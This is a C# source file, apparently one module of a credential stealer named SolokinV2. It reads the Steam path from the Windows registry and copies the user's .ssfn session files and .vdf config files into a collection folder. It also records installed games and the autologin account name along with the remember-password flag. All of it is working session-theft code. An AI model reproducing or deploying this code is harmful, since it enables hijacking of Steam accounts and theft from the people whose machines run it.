using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static SolokinV2.Start;

namespace SolokinV2
{
    internal sealed class Steam
    {
        public static bool GetSteamSession(string sSavePath)
        {
            var rkSteam = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");

            var sSteamPath = rkSteam.GetValue("SteamPath").ToString();


            Directory.CreateDirectory(sSavePath);

            var rkApps = rkSteam.OpenSubKey("Apps");

            try
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[+] Getting Steam App List...");

                }
                // Get steam applications list
                foreach (var gameId in rkApps.GetSubKeyNames())
                    using (var app = rkSteam.OpenSubKey("Apps\\" + gameId))
                    {
                        if (app == null) continue;
                        var name = (string)app.GetValue("Name");
                        name = string.IsNullOrEmpty(name) ? "Unknown" : name;
                        var installed = (int)app.GetValue("Installed") == 1 ? "Yes" : "No";
                        var running = (int)app.GetValue("Running") == 1 ? "Yes" : "No";
                        var updating = (int)app.GetValue("Updating") == 1 ? "Yes" : "No";

                        File.AppendAllText(sSavePath + "\\Apps.txt",
                            $"Application {name}\n\tGameID: {gameId}\n\tInstalled: {installed}\n\tRunning: {running}\n\tUpdating: {updating}\n\n");
                    }
            }
            catch (Exception ex)
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[-] Failed Getting Atleast One of The apps");

                }
            }

            try
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[+] Getting .ssfn Files...");

                }
                // Copy .ssfn files
                if (Directory.Exists(sSteamPath))
                {
                    Directory.CreateDirectory(sSavePath + "\\ssnf");
                    foreach (var file in Directory.GetFiles(sSteamPath))
                        if (file.Contains("ssfn"))
                            File.Copy(file, sSavePath + "\\ssnf\\" + Path.GetFileName(file));
                }
            }
            catch (Exception ex)
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[-] Failed Copying .ssfn Files");

                }
            }

            try
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[+] Copying .vdf Files...");

                }
                // Copy .vdf files
                var configPath = Path.Combine(sSteamPath, "config");
                if (Directory.Exists(configPath))
                {
                    Directory.CreateDirectory(sSavePath + "\\configs");
                    foreach (var file in Directory.GetFiles(configPath))
                        if (file.EndsWith("vdf"))
                            File.Copy(file, sSavePath + "\\configs\\" + Path.GetFileName(file));
                }
            }
            catch (Exception ex)
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[-] Failed Copying .vdf Files");

                }
            }

            try
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[+] Getting Other Details...");

                }
                var rememberPassword = (int)rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                var sSteamInfo = string.Format(
                    "Autologin User: " + rkSteam.GetValue("AutoLoginUser") +
                    "\nRemember password: " + rememberPassword
                );
                File.WriteAllText(sSavePath + "\\SteamInfo.txt", sSteamInfo);
            }
            catch (Exception ex)
            {
                string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[-] Failed Getting Other Details");

                }
            }


            return true;

            Thread.Sleep(5000);
            Environment.Exit(0);
        }
    }
}
